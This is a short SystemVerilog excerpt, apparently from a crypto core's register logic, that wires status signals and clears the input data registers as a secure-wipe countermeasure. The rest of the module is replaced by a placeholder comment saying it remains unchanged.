    .idle_we_o                 ( hw2reg.status.idle.de                  ),
    .stall_o                   ( hw2reg.status.stall.d                  ),
    .stall_we_o                ( hw2reg.status.stall.de                 ),
    .output_lost_i             ( reg2hw.status.output_lost.q            ),
    .output_lost_o             ( hw2reg.status.output_lost.d            ),
    .output_lost_we_o          ( hw2reg.status.output_lost.de           ),
    .output_valid_o            ( hw2reg.status.output_valid.d           ),
    .output_valid_we_o         ( hw2reg.status.output_valid.de          ),
    .input_ready_o             ( hw2reg.status.input_ready.d            ),
    .input_ready_we_o          ( hw2reg.status.input_ready.de           )
  );

  // SEC_CM: DATA_REG.SEC_WIPE
  // Input data register clear
  always_comb begin : data_in_reg_clear
    for (int i = 0; i < NumRegsData; i++) begin
      hw2reg.data_in[i].d  = prd_clearing_data[i];
      hw2reg.data_in[i].de = data_in_we;
    end
  end

  ///////////////
  // Selectors //
  ///////////////

  // (remains unchanged...)

  // ...[The selectors and the rest of the unchanged file continues as in the original]...

endmodule